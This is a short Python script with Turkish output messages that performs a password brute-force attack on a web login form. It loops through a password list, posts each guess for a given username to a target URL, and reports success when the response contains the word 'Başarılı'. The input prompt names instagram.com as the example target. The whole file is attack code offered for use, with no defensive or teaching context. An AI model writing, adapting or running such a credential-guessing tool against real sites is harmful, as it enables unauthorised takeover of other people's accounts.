import requests

def brute_force(url, username, password_list):
    with open(password_list, 'r') as file:
        passwords = file.readlines()
    
    for password in passwords:
        password = password.strip()
        print(f"[!] Deneniyor: {password}")
        
        response = requests.post(url, data={'username': username, 'password': password})
        
        if response.status_code == 200 and "Başarılı" in response.text:
            print(f"[+] Şifre bulundu: {password}")
            return password
        else:
            print(f"[-] Şifre yanlış: {password}")
    
    print("[!] Şifre bulunamadı.")
    return None

if __name__ == "__main__":
    target_url = input("http://instagram.com): ").strip()
    username = input("Kullanıcı adı: ").strip()
    password_list_path = input("Şifre listesi dosya yolu: ").strip()
    
    print("[*] Brute force işlemi başlatılıyor...")
    brute_force(target_url, username, password_list_path)